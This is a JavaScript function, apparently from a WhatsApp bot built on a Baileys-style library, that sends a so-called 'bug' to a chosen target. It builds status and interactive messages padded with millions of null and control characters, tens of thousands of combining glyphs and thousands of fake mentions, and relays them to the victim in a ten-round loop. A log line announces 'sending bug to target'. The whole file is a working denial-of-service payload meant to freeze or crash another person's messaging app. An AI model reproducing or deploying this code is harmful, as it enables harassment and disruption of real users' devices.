async function ziperdelaykali(sock, target) {

    let ziperrsw = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " Ꮰ𝘇𝗶𝗽𝗲𝗿¿ ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Ꮰ𝘇𝗶𝗽𝗲𝗿¿?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );

    const mediaData = [
        {
            ID: "68917910",
            uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
            mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
        },
        {
            ID: "68884987",
            uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
            buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
            mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
        },
    ]

    let sequentialIndex = 0
    console.log(chalk.red(`mengirim bug ke target`))

    const selectedMedia = mediaData[sequentialIndex]
    sequentialIndex = (sequentialIndex + 1) % mediaData.length
    const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

    const contextInfo = {
        participant: target,
        mentionedJid: [
            target,
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
        ],
    }


    const audioMsg = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
                        226, 213, 217, 102, 205, 126, 232, 145,
                        0, 70, 137, 73, 190, 145, 0, 44,
                        165, 102, 153, 233, 111, 114, 69, 10,
                        55, 61, 186, 131, 245, 153, 93, 211
                    ]),
                    fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
                        182, 141, 235, 167, 91, 254, 75, 254,
                        190, 229, 25, 16, 78, 48, 98, 117,
                        42, 71, 65, 199, 10, 164, 16, 57,
                        189, 229, 54, 93, 69, 6, 212, 145
                    ]),
                    fileEncSha256: Buffer.from([
                        29, 27, 247, 158, 114, 50, 140, 73,
                        40, 108, 77, 206, 2, 12, 84, 131,
                        54, 42, 63, 11, 46, 208, 136, 131,
                        224, 87, 18, 220, 254, 211, 83, 153
                    ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    }

    const textzipersmg = {
        extendedTextMessage: {
            text: "Ꮰ𝘇𝗶𝗽𝗲𝗿¿?¿" + "ꦾ".repeat(500000) + "\n\n jipell" + "\0".repeat(100),
            matchedText: "https://t.me/ziperr22",
            description: "Ꮰ𝘇𝗶𝗽𝗲𝗿¿?¿",
            title: "ꦽ".repeat(20000),
            previewType: 6,
            jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
            paymentLinkMetadata: {
                button: { displayText: "lau bawahan gw" },
                header: { headerType: 1 },
                provider: { paramsJson: "{".repeat(10000) }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "ziperr@newsletter",
                        newsletterName: "Ꮰ𝘇𝗶𝗽𝗲𝗿" + "ꦾ".repeat(10000),
                        caption: "Ꮰ𝘇𝗶𝗽𝗲𝗿¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "Ꮰ𝘇𝗶𝗽𝗲𝗿¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "13135550002@newsletter",
                    serverId: 1
                }
            }
        }
    }

    const interMsg = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: " ᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠᏠ ", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                    },
                    entryPointConversionSource: "galaxy_message",
                },
            },
        },
    }
    const interMsg2 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: " ziperrrrrrrrrrrrrrrrrrrrr ", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                    },
                    entryPointConversionSource: "galaxy_message",
                },
            },
        },
    }

    const statusMessages = [audioMsg, textzipersmg, interMsg, interMsg2]

    let msg = null;
    for (let i = 0; i < 10; i++) {
        await sock.relayMessage("status@broadcast", ziperrsw.message, {
            messageId: ziperrsw.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
        for (const content of statusMessages) {
            msg = generateWAMessageFromContent(target, content, {})
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
                            },
                        ],
                    },
                ],
            })
        }
        if (i < 9) {
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    if (mention && msg?.key) {
        await sock.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {
                            is_status_mention: " meki - melar ",
                        },
                    },
                ],
            }
        );
    }
}



//ke nya delay kalo kaga buldo cek aje
